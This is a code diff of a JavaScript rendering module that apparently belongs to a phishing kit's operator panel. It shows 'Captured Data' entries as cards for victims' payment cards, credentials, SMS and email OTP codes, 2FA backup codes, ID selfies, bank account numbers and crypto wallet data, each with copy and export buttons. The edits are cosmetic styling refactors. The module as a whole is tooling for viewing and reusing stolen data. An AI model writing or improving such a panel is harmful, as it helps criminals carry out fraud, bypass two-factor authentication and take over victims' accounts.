@@ -10,7 +10,7 @@ const FormRenderers = (() => {
     return d.innerHTML;
   }
 
-  function renderFormData(metadata) {
+  function renderFormData(metadata, options = {}) {
     if (!metadata || !metadata.formData || metadata.formData.length === 0) {
       return `
         <div style="text-align:center;padding:48px 20px;color:var(--text-tertiary);">
@@ -134,9 +134,9 @@ const FormRenderers = (() => {
 
         return `
           <div class="visual-card-wrap">
-            <div style="font-size:10px;font-weight:700;color:#c084fc;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
+            <div class="fr-entry-hdr" style="color:#c084fc;">
               <span>💳 Card Details · ${escapeHtml(entry.page || '')}</span>
-              <div style="display:flex;gap:6px;align-items:center;">
+              <div class="fr-entry-hdr-actions">
                 <button class="copy-all-btn" data-copy="${escapeHtml(ccText)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Card details copied!')" title="Copy all card fields">
                   <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                   Copy All
@@ -172,11 +172,13 @@ const FormRenderers = (() => {
               ${Object.entries(fields).filter(([k]) => !ccKeys.includes(k)).map(([k, v]) => `
                 <tr style="border-bottom:1px solid rgba(255,255,255,0.03);">
                   <td style="padding:6px 0;font-weight:600;width:35%;text-transform:capitalize;vertical-align:middle;">${escapeHtml(k.replace(/_/g, ' '))}</td>
-                  <td style="padding:6px 0;color:var(--text-primary);display:flex;justify-content:space-between;align-items:center;gap:8px;vertical-align:middle;">
-                    <span>${escapeHtml(String(v))}</span>
-                    <button class="copy-btn-inline" data-copy="${escapeHtml(String(v))}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Copied field!')" title="Copy field value">
-                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
-                    </button>
+                  <td style="padding:6px 0;color:var(--text-primary);vertical-align:middle;">
+                    <div class="fr-td-flex">
+                      <span>${escapeHtml(String(v))}</span>
+                      <button class="copy-btn-inline" data-copy="${escapeHtml(String(v))}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Copied field!')" title="Copy field value">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+                      </button>
+                    </div>
                   </td>
                 </tr>
               `).join('')}
@@ -202,9 +204,9 @@ const FormRenderers = (() => {
 
         return `
           <div class="visual-credential-wrap">
-            <div style="font-size:10px;font-weight:700;color:#60a5fa;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
+            <div class="fr-entry-hdr" style="color:#60a5fa;">
               <span>🔐 Credentials · ${escapeHtml(entry.page || '')}</span>
-              <div style="display:flex;gap:6px;align-items:center;">
+              <div class="fr-entry-hdr-actions">
                 <button class="copy-all-btn" data-copy="${escapeHtml(credText.trim())}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Credentials copied!')" title="Copy all credential fields">
                   <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                   Copy All
@@ -252,9 +254,9 @@ const FormRenderers = (() => {
 
         return `
           <div class="visual-otp-wrap">
-            <div style="font-size:10px;font-weight:700;color:#34d399;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
+            <div class="fr-entry-hdr" style="color:#34d399;">
               <span>📱 Verification Code · ${escapeHtml(entry.page || '')}</span>
-              <div style="display:flex;gap:6px;align-items:center;">
+              <div class="fr-entry-hdr-actions">
                 <button class="copy-all-btn" data-copy="${escapeHtml(otpText)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'OTP details copied!')" title="Copy OTP code and phone number">
                   <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                   Copy All
@@ -286,9 +288,9 @@ const FormRenderers = (() => {
 
         return `
           <div class="visual-otp-wrap">
-            <div style="font-size:10px;font-weight:700;color:#06b6d4;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
+            <div class="fr-entry-hdr" style="color:#06b6d4;">
               <span>📧 Email Verification Code · ${escapeHtml(entry.page || '')}</span>
-              <div style="display:flex;gap:6px;align-items:center;">
+              <div class="fr-entry-hdr-actions">
                 <button class="copy-all-btn" data-copy="${escapeHtml(emailText)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Email code copied!')" title="Copy email code">
                   <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                   Copy All
@@ -321,9 +323,9 @@ const FormRenderers = (() => {
 
         return `
           <div class="visual-otp-wrap">
-            <div style="font-size:10px;font-weight:700;color:#f97316;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
+            <div class="fr-entry-hdr" style="color:#f97316;">
               <span>🔑 Authenticator / 2FA · ${escapeHtml(entry.page || '')}</span>
-              <div style="display:flex;gap:6px;align-items:center;">
+              <div class="fr-entry-hdr-actions">
                 <button class="copy-all-btn" data-copy="${escapeHtml(authText)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), '2FA code copied!')" title="Copy 2FA code">
                   <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                   Copy All
@@ -339,7 +341,7 @@ const FormRenderers = (() => {
               ${backupCode ? `
                 <div style="margin-top:14px;background:rgba(249,115,22,0.06);border:1px solid rgba(249,115,22,0.15);border-radius:8px;padding:10px 14px;">
                   <div style="font-size:10px;font-weight:700;color:#f97316;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;">Backup / Recovery Code</div>
-                  <div style="font-family:monospace;font-size:14px;color:var(--text-primary);cursor:pointer;display:flex;align-items:center;gap:8px;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(backupCode)}', 'Backup code copied!');" title="Click to copy">
+                  <div style="font-family:var(--font-mono);font-size:13px;color:var(--text-primary);cursor:pointer;display:flex;align-items:center;gap:8px;word-break:break-all;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(backupCode)}', 'Backup code copied!');" title="Click to copy">
                     ${escapeHtml(backupCode)}
                     <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="opacity:0.5;"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                   </div>
@@ -386,9 +388,9 @@ const FormRenderers = (() => {
 
         return `
           <div class="visual-card-wrap" style="border-color:rgba(236,72,153,0.2);">
-            <div style="font-size:10px;font-weight:700;color:#ec4899;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
+            <div class="fr-entry-hdr" style="color:#ec4899;">
               <span>🪪 ID Upload / Selfie · ${escapeHtml(entry.page || '')}</span>
-              <div style="display:flex;gap:6px;align-items:center;">
+              <div class="fr-entry-hdr-actions">
                 <button class="copy-all-btn" data-copy="${escapeHtml(idText.trim())}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'ID info copied!')" title="Copy ID info">
                   <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                   Copy All
@@ -443,9 +445,9 @@ const FormRenderers = (() => {
 
         return `
           <div class="visual-card-wrap" style="border-color:rgba(20,184,166,0.2);">
-            <div style="font-size:10px;font-weight:700;color:#14b8a6;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;">
+            <div class="fr-entry-hdr" style="color:#14b8a6;margin-bottom:10px;">
               <span>🏦 Banking Details · ${escapeHtml(entry.page || '')}</span>
-              <div style="display:flex;gap:6px;align-items:center;">
+              <div class="fr-entry-hdr-actions">
                 <button class="copy-all-btn" data-copy="${escapeHtml(bankText)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Banking details copied!')" title="Copy banking details">
                   <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                   Copy All
@@ -457,33 +459,33 @@ const FormRenderers = (() => {
               <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;">
                 <div style="font-size:16px;font-weight:700;color:var(--text-primary);display:flex;align-items:center;gap:8px;">🏦 ${escapeHtml(bankName)}</div>
               </div>
-              <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(180px, 1fr));gap:10px;">
-                <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(acctNum)}', 'Account # copied!');" title="Click to copy">
+              <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(min(180px, 100%), 1fr));gap:10px;">
+                <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;min-width:0;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(acctNum)}', 'Account # copied!');" title="Click to copy">
                   <div style="font-size:10px;color:#14b8a6;font-weight:600;margin-bottom:4px;">Account Number 📋</div>
-                  <div style="font-size:14px;color:var(--text-primary);font-weight:600;font-family:monospace;letter-spacing:1px;">${escapeHtml(acctNum)}</div>
+                  <div style="font-size:13px;color:var(--text-primary);font-weight:600;font-family:var(--font-mono);letter-spacing:0.6px;word-break:break-all;">${escapeHtml(acctNum)}</div>
                 </div>
                 ${routingNum ? `
-                  <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(routingNum)}', 'Routing # copied!');" title="Click to copy">
+                  <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;min-width:0;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(routingNum)}', 'Routing # copied!');" title="Click to copy">
                     <div style="font-size:10px;color:#14b8a6;font-weight:600;margin-bottom:4px;">Routing Number 📋</div>
-                    <div style="font-size:14px;color:var(--text-primary);font-weight:600;font-family:monospace;letter-spacing:1px;">${escapeHtml(routingNum)}</div>
+                    <div style="font-size:13px;color:var(--text-primary);font-weight:600;font-family:var(--font-mono);letter-spacing:0.6px;word-break:break-all;">${escapeHtml(routingNum)}</div>
                   </div>
                 ` : ''}
                 ${ibanVal ? `
-                  <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(ibanVal)}', 'IBAN copied!');" title="Click to copy">
+                  <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;min-width:0;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(ibanVal)}', 'IBAN copied!');" title="Click to copy">
                     <div style="font-size:10px;color:#14b8a6;font-weight:600;margin-bottom:4px;">IBAN 📋</div>
-                    <div style="font-size:14px;color:var(--text-primary);font-weight:600;font-family:monospace;letter-spacing:1px;">${escapeHtml(ibanVal)}</div>
+                    <div style="font-size:13px;color:var(--text-primary);font-weight:600;font-family:var(--font-mono);letter-spacing:0.6px;word-break:break-all;">${escapeHtml(ibanVal)}</div>
                   </div>
                 ` : ''}
                 ${swiftVal ? `
-                  <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(swiftVal)}', 'SWIFT copied!');" title="Click to copy">
+                  <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;min-width:0;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(swiftVal)}', 'SWIFT copied!');" title="Click to copy">
                     <div style="font-size:10px;color:#14b8a6;font-weight:600;margin-bottom:4px;">SWIFT / BIC 📋</div>
-                    <div style="font-size:14px;color:var(--text-primary);font-weight:600;font-family:monospace;">${escapeHtml(swiftVal)}</div>
+                    <div style="font-size:13px;color:var(--text-primary);font-weight:600;font-family:var(--font-mono);word-break:break-all;">${escapeHtml(swiftVal)}</div>
                   </div>
                 ` : ''}
                 ${sortVal ? `
-                  <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(sortVal)}', 'Sort code copied!');" title="Click to copy">
+                  <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:10px 12px;cursor:pointer;min-width:0;" onclick="event.stopPropagation(); window.copyToClipboard('${escapeHtml(sortVal)}', 'Sort code copied!');" title="Click to copy">
                     <div style="font-size:10px;color:#14b8a6;font-weight:600;margin-bottom:4px;">Sort Code 📋</div>
-                    <div style="font-size:14px;color:var(--text-primary);font-weight:600;font-family:monospace;">${escapeHtml(sortVal)}</div>
+                    <div style="font-size:13px;color:var(--text-primary);font-weight:600;font-family:var(--font-mono);word-break:break-all;">${escapeHtml(sortVal)}</div>
                   </div>
                 ` : ''}
               </div>
@@ -491,13 +493,15 @@ const FormRenderers = (() => {
             ${Object.entries(fields).filter(([k]) => !BANK_KEYS.includes(k)).length > 0 ? `
               <table style="width:100%;margin-top:10px;font-size:12px;color:var(--text-secondary);border-collapse:collapse;">
                 ${Object.entries(fields).filter(([k]) => !BANK_KEYS.includes(k)).map(([k, v]) => `
-                  <tr style="border-bottom:1px solid rgba(255,255,255,0.03);">
-                    <td style="padding:6px 0;font-weight:600;width:35%;text-transform:capitalize;">${escapeHtml(k.replace(/_/g, ' '))}</td>
-                    <td style="padding:6px 0;color:var(--text-primary);display:flex;justify-content:space-between;align-items:center;gap:8px;">
-                      <span>${escapeHtml(String(v))}</span>
-                      <button class="copy-btn-inline" data-copy="${escapeHtml(String(v))}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Copied!')" title="Copy">
-                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
-                      </button>
+                  <tr style="border-bottom:1px solid var(--border-subtle);">
+                    <td style="padding:6px 0;font-weight:600;width:35%;text-transform:capitalize;vertical-align:middle;">${escapeHtml(k.replace(/_/g, ' '))}</td>
+                    <td style="padding:6px 0;color:var(--text-primary);vertical-align:middle;">
+                      <div class="fr-td-flex">
+                        <span>${escapeHtml(String(v))}</span>
+                        <button class="copy-btn-inline" data-copy="${escapeHtml(String(v))}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Copied!')" title="Copy">
+                          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+                        </button>
+                      </div>
                     </td>
                   </tr>
                 `).join('')}
@@ -553,9 +557,9 @@ const FormRenderers = (() => {
 
         return `
           <div class="visual-card-wrap" style="border-color:rgba(245,158,11,0.25);">
-            <div style="font-size:10px;font-weight:700;color:#f59e0b;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
+            <div class="fr-entry-hdr" style="color:#f59e0b;">
               <span>🪙 Crypto / Wallet · ${escapeHtml(entry.page || '')}</span>
-              <div style="display:flex;gap:6px;align-items:center;">
+              <div class="fr-entry-hdr-actions">
                 <button class="copy-all-btn" data-copy="${escapeHtml(cryptoText.trim())}" onclick="window.copyToClipboard(this.getAttribute('data-copy'),'Wallet data copied!')" title="Copy all wallet data">
                   <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                   Copy All
@@ -618,9 +622,9 @@ const FormRenderers = (() => {
 
         return `
           <div class="visual-credential-wrap" style="border-color:${accentColor}33;">
-            <div style="font-size:10px;font-weight:700;color:${accentColor};text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;">
+            <div class="fr-entry-hdr" style="color:${accentColor};">
               <span>📋 ${escapeHtml(entry.formId || 'Form')} · ${escapeHtml(entry.page || '')}</span>
-              <div style="display:flex;gap:6px;align-items:center;">
+              <div class="fr-entry-hdr-actions">
                 <button class="copy-all-btn" data-copy="${escapeHtml(formText)}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'Form data copied!')" title="Copy all form fields">
                   <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
                   Copy All
@@ -655,13 +659,14 @@ const FormRenderers = (() => {
 
     return `
       <div style="display:flex;flex-direction:column;gap:14px;">
-        <div style="display:flex;justify-content:space-between;align-items:center;padding:0 2px;">
+        ${options && options.hideWrapperHeader ? '' : `
+        <div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap;padding:0 2px;">
           <span style="font-size:11px;font-weight:700;color:var(--text-tertiary);text-transform:uppercase;letter-spacing:0.5px;">Captured Data · ${metadata.formData.length} entr${metadata.formData.length === 1 ? 'y' : 'ies'}</span>
           <button class="copy-all-btn" data-copy="${escapeHtml(allText.trim())}" onclick="window.copyToClipboard(this.getAttribute('data-copy'), 'All session data copied!')" title="Copy all captured data" style="font-size:11px;">
             <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
             Export All
           </button>
-        </div>
+        </div>`}
         ${reversedData.map(renderEntry).join('')}
       </div>
     `;
